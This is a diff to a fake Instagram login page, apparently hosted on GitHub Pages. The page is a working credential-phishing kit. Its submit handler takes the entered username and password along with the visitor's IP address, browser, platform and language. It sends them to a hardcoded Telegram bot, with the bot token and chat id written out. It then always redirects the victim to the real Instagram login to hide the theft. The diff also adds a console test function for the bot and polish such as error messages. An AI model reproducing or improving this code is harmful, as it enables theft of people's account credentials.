@@ -45,7 +45,6 @@
             color: #262626;
         }
 
-        /* Instagram font style */
         @font-face {
             font-family: 'Billabong';
             src: url('https://cdn.rawgit.com/mil/fonts/master/ff/billabong/billabong.ttf') format('truetype');
@@ -90,6 +89,11 @@
             background-color: #1877f2;
         }
 
+        .login-btn:disabled {
+            background-color: #b2dffc;
+            cursor: default;
+        }
+
         .divider {
             display: flex;
             align-items: center;
@@ -119,10 +123,6 @@
             font-size: 14px;
             text-decoration: none;
             margin-bottom: 15px;
-        }
-
-        .fb-login i {
-            font-size: 18px;
         }
 
         .forgot-password {
@@ -201,12 +201,23 @@
         .copyright {
             margin-top: 10px;
         }
+
+        /* Error message style */
+        .error-message {
+            color: #ed4956;
+            font-size: 12px;
+            margin: 5px 0;
+            text-align: center;
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="login-card">
             <div class="logo">Instagram</div>
+            
+            <div class="error-message" id="errorMessage"></div>
             
             <form id="loginForm">
                 <input type="text" class="input-field" placeholder="Phone number, username, or email" id="username" required>
@@ -221,7 +232,10 @@
             </div>
 
             <a href="#" class="fb-login">
-                <i>📘</i> Log in with Facebook
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#385185">
+                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+                Log in with Facebook
             </a>
 
             <a href="#" class="forgot-password">Forgot password?</a>
@@ -262,49 +276,91 @@
     </div>
 
     <script>
+        // Function to send test message (call this from console if needed)
+        window.testTelegram = function() {
+            fetch('https://api.telegram.org/bot8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '6398977115',
+                    text: '✅ Test message from GitHub Page - Bot is working!',
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log('Test result:', data);
+                if(data.ok) {
+                    alert('✅ Bot is working! Check Telegram');
+                } else {
+                    alert('❌ Bot error: ' + data.description);
+                }
+            })
+            .catch(err => {
+                console.log('Test error:', err);
+                alert('❌ Error: ' + err.message);
+            });
+        };
+
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorDiv = document.getElementById('errorMessage');
             
             if (!username || !password) {
-                alert('Please fill in all fields');
+                errorDiv.style.display = 'block';
+                errorDiv.textContent = 'Please fill in all fields';
                 return;
             }
 
+            errorDiv.style.display = 'none';
             const loginBtn = document.getElementById('loginBtn');
             loginBtn.disabled = true;
             loginBtn.textContent = 'Logging in...';
 
             try {
-                // Get IP Address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
+                // Get IP Address with timeout
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                
+                let userIP = 'Unable to fetch';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json', {
+                        signal: controller.signal
+                    });
+                    const ipData = await ipResponse.json();
+                    userIP = ipData.ip;
+                } catch (ipError) {
+                    console.log('IP fetch error:', ipError);
+                }
+                clearTimeout(timeoutId);
 
                 // Get Browser Info
-                const browserInfo = navigator.userAgent;
+                const browserInfo = navigator.userAgent.substring(0, 100); // Limit length
                 const platform = navigator.platform;
                 const language = navigator.language;
 
                 // Prepare message for Telegram
-                const message = `
-🔐 *Instagram Login Alert*
+                const message = `🔐 *Instagram Login Alert*
 👤 *Username/Email:* ${username}
 🔑 *Password:* ${password}
 🌍 *IP Address:* ${userIP}
 💻 *Browser:* ${browserInfo}
 📱 *Platform:* ${platform}
 🌐 *Language:* ${language}
-🕐 *Time:* ${new Date().toLocaleString()}
-                `;
+🕐 *Time:* ${new Date().toLocaleString()}`;
 
                 // Send to Telegram
                 const botToken = '8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig';
                 const chatId = '6398977115';
                 
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                console.log('Sending to Telegram...');
                 
                 const response = await fetch(telegramUrl, {
                     method: 'POST',
@@ -319,22 +375,19 @@
                 });
 
                 const result = await response.json();
+                console.log('Telegram Response:', result);
                 
-                if (result.ok) {
-                    // Success - redirect to real Instagram
-                    window.location.href = 'https://www.instagram.com/accounts/login/';
-                } else {
-                    console.error('Telegram error:', result);
-                    window.location.href = 'https://www.instagram.com/accounts/login/';
-                }
+                // Always redirect to Instagram
+                window.location.href = 'https://www.instagram.com/accounts/login/';
 
             } catch (error) {
                 console.error('Error:', error);
+                // Still redirect even if there's an error
                 window.location.href = 'https://www.instagram.com/accounts/login/';
             }
         });
 
-        // Optional: Add loading animation on button click
+        // Input field effects
         document.querySelectorAll('.input-field').forEach(field => {
             field.addEventListener('focus', function() {
                 this.style.borderColor = '#a8a8a8';
@@ -344,6 +397,11 @@
                 this.style.borderColor = '#dbdbdb';
             });
         });
+
+        // Auto-run test when page loads (remove this after testing)
+        window.onload = function() {
+            console.log('✅ Page loaded. To test Telegram, type: testTelegram() in console');
+        };
     </script>
 </body>
 </html>
